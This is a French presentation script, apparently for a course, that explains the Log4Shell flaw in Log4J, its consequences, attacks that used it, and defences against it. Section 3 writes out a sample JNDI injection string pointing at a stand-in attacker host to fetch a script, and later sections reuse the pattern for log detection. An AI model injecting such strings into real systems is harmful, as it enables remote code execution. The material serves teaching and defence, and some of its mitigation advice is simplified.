### la vulnérabilité Log4Shell

[...retour en arriere](../../../README.md)

---

## 1. **Introduction : Présentation générale et importance de Log4Shell**
   - **Durée : 2 minutes**

Bonjour à tous et merci de votre attention. Aujourd'hui, nous allons explorer en profondeur une vulnérabilité majeure découverte en décembre 2021, **Log4Shell**. Cette faille a secoué le monde de l'informatique avec un score de **10/10 sur l’échelle CVSS** (**Common Vulnerability Scoring System**, un système qui évalue la gravité des vulnérabilités). Cette vulnérabilité a affecté des infrastructures critiques, des serveurs de jeu **Minecraft** aux services **Amazon Web Services**, en passant par des systèmes IoT comme les **voitures Tesla**.

L'impact mondial a été immédiat. Dès la découverte de cette faille, des milliers de systèmes ont été attaqués, forçant des entreprises à réagir rapidement pour colmater cette brèche. Aujourd'hui, nous allons comprendre ensemble **ce qu'est Log4Shell**, **comment elle fonctionne**, et **comment nous protéger contre cette vulnérabilité**.

**Plan de l’exposé :**
1. Contexte : Qu’est-ce que Log4J et pourquoi est-il si utilisé ?
2. Description technique de l'attaque Log4Shell, appuyée par une illustration.
3. Conséquences de l’attaque pour les systèmes touchés.
4. Attaques notables utilisant Log4Shell.
5. Mesures de protection pour limiter les risques.

---

## 2. **Contexte : Qu'est-ce que Log4J et pourquoi est-il si utilisé ?**
   - **Durée : 2 minutes**
   
Pour bien comprendre Log4Shell, revenons d’abord sur **Log4J**, la bibliothèque Java au cœur de cette vulnérabilité. **Log4J** est une bibliothèque dédiée à la **journalisation** des événements dans les applications Java, c’est-à-dire qu’elle enregistre les actions effectuées dans une application : les erreurs, les requêtes HTTP, ou les interactions des utilisateurs. Cela permet de garder une trace de ce qui se passe dans le système, un élément crucial pour le débogage, la surveillance et la gestion des performances.

Dans cette **première image**, on voit comment Log4J fonctionne dans un cas normal. Le **navigateur web** (comme **Mozilla Firefox** ou **Google Chrome**) envoie une requête HTTP au serveur. Cette requête contient des informations comme le **User-Agent** (qui identifie le type de navigateur et sa version), que le **serveur** enregistre dans un fichier de logs via **Log4J**. Ce processus permet aux administrateurs de suivre les interactions avec l’application et d’avoir une vision claire de son activité.

Log4J est particulièrement populaire parce qu'il offre une **flexibilité** et une **puissance** que d'autres outils de journalisation n'ont pas. Il permet par exemple de créer des logs riches en détails avec des **expressions dynamiques**, comme l'heure ou l'adresse IP du client, qui peuvent être insérées dans les logs automatiquement. Cependant, cette fonctionnalité est précisément ce qui a rendu Log4J vulnérable à **Log4Shell**.

---

## 3. **Description technique de l’attaque : Comment fonctionne Log4Shell ?**
   - **Durée : 3 minutes**

Nous allons maintenant détailler le fonctionnement de l'attaque Log4Shell, en utilisant cette **seconde image** pour illustrer les étapes du processus.

Log4Shell exploite une fonctionnalité de **lookup dynamique** dans Log4J. Cette fonctionnalité permet à Log4J d’exécuter des expressions insérées dans des champs comme le **User-Agent** ou les **paramètres HTTP**. Malheureusement, cela signifie que si un attaquant injecte une chaîne malveillante, Log4J peut interpréter et **exécuter cette chaîne**, entraînant une **exécution de code à distance**.

Voici comment l’attaque se déroule en détail, en suivant les étapes illustrées dans l’image :

1. **Injection de la chaîne malveillante** : L’attaquant envoie une requête contenant une chaîne malveillante dans un champ comme le **User-Agent**. Dans l’image, la chaîne ressemble à ceci : `${jndi:ldap://sitedupirate[.]com/script-dangereux.sh}`. Ce que cela signifie, c’est que l’attaquant demande à Log4J de contacter un serveur **LDAP** (Lightweight Directory Access Protocol), qui est sous le contrôle du pirate.

2. **Appel à JNDI** : **JNDI** (**Java Naming and Directory Interface**) est une interface Java qui permet de retrouver des objets distants via des protocoles comme **LDAP** ou **DNS**. Log4J voit la chaîne `${jndi:ldap://...}`, contacte le serveur **LDAP** du pirate et tente de charger un objet Java depuis ce serveur.

3. **Exécution du code malveillant** : Une fois que le serveur vulnérable a contacté le serveur du pirate, celui-ci renvoie un **objet Java sérialisé** contenant du code malveillant, qui est ensuite exécuté directement sur le serveur vulnérable. Ce processus permet à l'attaquant de **prendre le contrôle total** du serveur et d'exécuter des scripts comme le `script-dangereux.sh` visible dans l’image.

**Pourquoi cette attaque est-elle si redoutable ?**
- **Surface d’attaque étendue** : Le pirate peut injecter cette chaîne dans de nombreux points d'entrée de l'application, que ce soit dans l'URL, les headers HTTP, ou même les formulaires de saisie. Tout endroit où Log4J peut enregistrer des logs devient potentiellement dangereux.
- **Exploitation facile** : Un simple accès à l’application via une requête HTTP suffit pour injecter du code.
- **Exécution à distance** : Le serveur va récupérer et exécuter du code Java à partir d’un serveur contrôlé par l'attaquant. Cela donne un contrôle total au pirate sur le serveur vulnérable.

---

## 4. Conséquences : Quels sont les risques concrets de Log4Shell ?
- **Durée : 2 minutes**
- 
Les conséquences de Log4Shell sont très sérieuses. En accédant à un serveur via cette vulnérabilité, un attaquant peut prendre le contrôle complet du serveur, exécuter des scripts arbitraires, installer des ransomwares, ou même voler des informations sensibles.

Les sociétés de cybersécurité, comme CheckPoint et Palo Alto Networks, ont observé une augmentation massive des attaques exploitant cette vulnérabilité dès sa divulgation. Certaines variantes d’attaques ont été particulièrement sophistiquées, utilisant des chaînes encodées en Base64 pour échapper à la détection et rendre l’analyse plus complexe.

De plus, même après les premiers correctifs de Log4J, des vulnérabilités supplémentaires ont été découvertes, notamment liées à des attaques DDoS (Denial of Service) sur certaines configurations de Log4J. Cela montre à quel point cette vulnérabilité est difficile à éradiquer totalement.

## 5. **Attaques notables utilisant Log4Shell**
   - **Durée : 2 minutes**

Depuis sa découverte, **Log4Shell** a été largement exploité par des cybercriminels et des groupes malveillants. Voici quelques exemples d’attaques notables :

1. **Attaque sur le ministère de la Défense belge (décembre 2021)**  
   Le **ministère de la Défense belge** a été contraint de fermer certaines parties de son réseau à la suite d’une attaque exploitant Log4Shell. Cet incident a montré que même les infrastructures gouvernementales sensibles étaient des cibles, et l’impact a été suffisamment grave pour nécessiter une interruption des services.

2. **Exploitation de VMware Horizon par des groupes APT**  
   Des groupes de pirates avancés, comme **Aquatic Panda**, ont utilisé Log4Shell pour infiltrer des systèmes critiques, dont un institut de recherche scientifique américain via **VMware Horizon**. Ils ont profité de la vulnérabilité pour accéder à des infrastructures internes, mais l’attaque a été stoppée à temps avant de causer des dommages importants.

3. **Attaques de botnets**  
   Des botnets bien connus, comme **Mirai** et **Muhstik**, ont rapidement intégré Log4Shell dans leurs techniques d’exploitation pour infecter des appareils IoT vulnérables et les transformer en réseaux d’attaque DDoS (Distributed Denial of Service).

4. **Attaques de ransomwares**  
   Des groupes de ransomwares comme **Conti** ont utilisé Log4Shell pour accéder à des systèmes vulnérables, voler des données, et chiffrer des fichiers avant de demander des rançons.

Ces attaques montrent à quel point **Log4Shell** a été rapidement intégré dans des attaques à grande échelle, ciblant aussi bien des infrastructures gouvernementales que des entreprises privées ou des services publics. Les impacts ont été mondiaux, et de nombreux systèmes sont encore vulnérables.

---

## 6. **Mesures de protection : Comment se protéger contre Log4Shell ?**
   - **Durée : 2 minutes**

Passons maintenant aux mesures de protection. Il existe plusieurs façons de se protéger contre Log4Shell, mais il est essentiel d'agir rapidement.

1. **Mettre à jour Log4J** : La version **2.16** de Log4J désactive par défaut l'accès à **JNDI**, rendant l’attaque impossible. Si possible, il est crucial de **mettre à jour toutes les instances** de Log4J dans vos systèmes. Si vous ne pouvez pas mettre à jour immédiatement, vous pouvez **désactiver JNDI** en définissant la propriété `log4j2.formatMsgNoLookups=true`.

2. **Utilisation de scanners de vulnérabilités** : Pour détecter si vos systèmes sont vulnérables, vous pouvez utiliser des **scanners spécifiques**. Ces outils simulent l’attaque Log4Shell en envoyant des requêtes contenant des chaînes malveillantes et en observant la réaction du serveur. Si le serveur tente de contacter une adresse externe comme `${jndi:ldap://...}`, cela signifie qu'il est vulnérable. Parmi les scanners recommandés, le **CERT-FR** propose des outils efficaces qui automatisent ces tests.
   
   - **Fonctionnement d’un scanner** : Le scanner va simuler l'attaque en injectant des chaînes

...malveillantes dans les requêtes HTTP. Il surveille ensuite les réponses du serveur pour détecter si celui-ci tente de contacter un serveur externe, ce qui indiquerait une tentative de **lookup JNDI**. Cela permet d’identifier les systèmes vulnérables avant que les hackers ne puissent en profiter.

3. **Pare-feu applicatif (WAF)** : Un **Web Application Firewall** peut bloquer les requêtes malveillantes avant qu'elles n'atteignent le serveur vulnérable. Bien que cela ne soit pas une solution définitive, c'est une bonne protection temporaire le temps que les correctifs soient appliqués.

4. **Surveillance des logs** : Il est important de **surveiller les fichiers de logs** pour détecter des tentatives d’attaques. Par exemple, chercher des chaînes de caractères telles que `${jndi:ldap://...}` dans les logs peut indiquer que quelqu'un essaie de compromettre votre système.

---

## 7. **Conclusion**
   - **Durée : 1 minute**

En conclusion, **Log4Shell** a montré à quel point une vulnérabilité dans un composant aussi largement utilisé que **Log4J** peut avoir des répercussions mondiales. Elle a souligné l’importance de la **vigilance continue** dans la gestion des dépendances logicielles et des mises à jour.

Pour résumer :
- **Mettez à jour Log4J** vers la version 2.16 ou désactivez JNDI.
- **Utilisez des scanners** pour détecter les systèmes vulnérables.
- **Surveillez vos logs** pour repérer des tentatives d’attaques et utilisez des **pare-feux** pour bloquer les requêtes malveillantes.

Merci pour votre attention, et rappelez-vous que la sécurité informatique nécessite une vigilance continue.

---

[...retour en arriere](../../../README.md)